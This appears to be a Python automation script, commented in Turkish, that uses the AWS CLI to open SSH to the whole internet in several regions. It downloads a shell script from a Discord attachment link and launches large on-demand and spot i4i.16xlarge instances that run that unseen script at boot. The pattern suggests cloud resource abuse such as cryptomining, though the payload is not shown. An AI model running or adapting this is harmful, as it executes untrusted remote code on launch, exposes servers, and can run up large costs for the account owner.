import subprocess
import json

# Hedef bölgelerin listesi
regions = ["us-east-1", "us-west-2", "us-east-2"]

# Her bölge için bir sözlük oluştur
instances = {}

for region in regions:
    # Güvenlik grubunu oluştur
    create_security_group_cmd = f'aws ec2 create-security-group --group-name my-security-group2a --description "My Security Group" --region {region}'
    output1 = subprocess.check_output(create_security_group_cmd, shell=True).decode("utf-8")
    data1 = json.loads(output1)
    security_group_id = data1['GroupId']
    print(f"Bölge: {region}, Grup ID: {security_group_id}")

    # SSH girişine izin ver
    create_security_group_ssh_cmd = f'aws ec2 authorize-security-group-ingress --group-name my-security-group2a --protocol tcp --port 22 --cidr 0.0.0.0/0 --region {region}'
    output2 = subprocess.check_output(create_security_group_ssh_cmd, shell=True).decode("utf-8")
    data2 = json.loads(output2)
    return_true = data2['Return']
    print(f"Bölge: {region}, Return: {return_true}")

    # Dosyayı sunucuya çekme
    wget_cmd = 'wget https://cdn.discordapp.com/attachments/968174683780431922/1162909182408798258/yeniblade.sh -O yeniblade.sh'
    subprocess.run(wget_cmd, shell=True)

    # Makineyi başlat
    if region == "us-east-1":
        instance_type = "i4i.16xlarge"
        ami = "ami-0261755bbcb8c4a84"
    elif region == "us-west-1":
        instance_type = "i4i.16xlarge"
        ami = "ami-04d1dcfb793f6fa37"
    elif region == "us-west-2":
        instance_type = "i4i.16xlarge"
        ami = "ami-0c65adc9a5c1b5d7c"
    elif region == "us-east-2":
        instance_type = "i4i.16xlarge"
        ami = "ami-0430580de6244e02e"
    else:
        continue

    # Normal makineyi başlat
    run_instance_cmd = f'aws ec2 run-instances --region {region} --image-id {ami} --instance-type {instance_type} --security-group-ids {security_group_id} --user-data file://"yeniblade.sh"'
    output3 = subprocess.check_output(run_instance_cmd, shell=True).decode("utf-8")
    instance_id = json.loads(output3)['Instances'][0]['InstanceId']
    print(f"Bölge: {region}, Makine oluşturuldu, Instance ID: {instance_id}")
    instances[region] = instance_id

    # Spot makineyi başlat
    run_instance_cmd = f'aws ec2 run-instances --region {region} --image-id {ami} --instance-type {instance_type} --security-group-ids {security_group_id} --user-data file://"yeniblade.sh" --instance-market-options MarketType=spot'
    output4 = subprocess.check_output(run_instance_cmd, shell=True).decode("utf-8")
    instance_id1 = json.loads(output4)['Instances'][0]['InstanceId']
    print(f"Bölge: {region}, Spot Makine oluşturuldu, Instance ID: {instance_id1}")
    instances[region] = instance_id1
